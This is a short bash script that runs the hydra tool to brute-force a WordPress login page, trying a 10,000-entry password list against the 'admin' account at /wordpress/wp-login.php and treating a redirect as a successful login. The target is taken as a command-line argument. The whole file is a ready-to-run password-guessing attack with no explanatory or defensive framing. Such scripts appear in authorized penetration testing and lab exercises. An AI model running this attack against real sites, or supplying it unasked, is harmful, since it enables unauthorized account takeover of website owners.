#!/bin/bash

target=${1}

hydra -l admin -P 10kpass.txt ${target} -V http-form-post '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'

